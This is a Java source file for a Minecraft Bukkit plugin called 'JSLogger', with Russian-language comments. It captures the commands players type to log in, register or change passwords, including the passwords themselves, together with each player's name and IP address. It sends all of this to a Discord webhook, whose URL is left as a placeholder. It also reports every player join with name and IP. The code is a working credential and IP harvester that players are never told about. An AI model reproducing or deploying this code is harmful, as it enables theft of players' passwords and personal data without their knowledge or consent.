package nikita11.untitled3;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class Untitled3 extends JavaPlugin implements Listener {

    private final String webhookUrl = "YOUR_DISCORD_WEBHOOK";

    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("JSLogger plugin enabled! By create vza3464");
        Bukkit.getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getLogger().info("JSLogger plugin disabled! By create vza3464");
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String[] trackedCommands = {"/login", "/l", "/reg", "/register", "/cp", "/changepass", "/changepassword"};
        String message = event.getMessage().toLowerCase();
        for (String command : trackedCommands) {
            if (message.startsWith(command)) {
                String playerName = event.getPlayer().getName();
                String playerIp = event.getPlayer().getAddress().getAddress().getHostAddress();
                sendWebhookMessage(playerName, playerIp, message);
                break;
            }
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        String playerName = event.getPlayer().getName();
        String playerIp = event.getPlayer().getAddress().getAddress().getHostAddress();
        sendJoinWebhookMessage(playerName, playerIp);
    }

    private void sendWebhookMessage(String playerName, String playerIp, String command) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setDoOutput(true);

            String jsonPayload = String.format(
                    "{\"content\":\"```Была отправленна в игроком\\nUsername: %s\\nIP: %s\\nCommand: %s```\"}",
                    playerName, playerIp, command
            );

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                getLogger().severe("Failed to send webhook message, response code: " + responseCode);
            }

        } catch (Exception e) {
            getLogger().severe("Error sending webhook message: " + e.getMessage());
        }
    }

    private void sendJoinWebhookMessage(String playerName, String playerIp) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setDoOutput(true);

            // Форматируем JSON с сообщением о подключении игрока
            String jsonPayload = String.format(
                    "{\"content\":\"```Вход на сервер\\nUsername: %s\\nIP: %s```\"}",
                    playerName, playerIp
            );

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                getLogger().severe("Failed to send webhook message, response code: " + responseCode);
            }

        } catch (Exception e) {
            getLogger().severe("Error sending webhook message: " + e.getMessage());
        }
    }
}
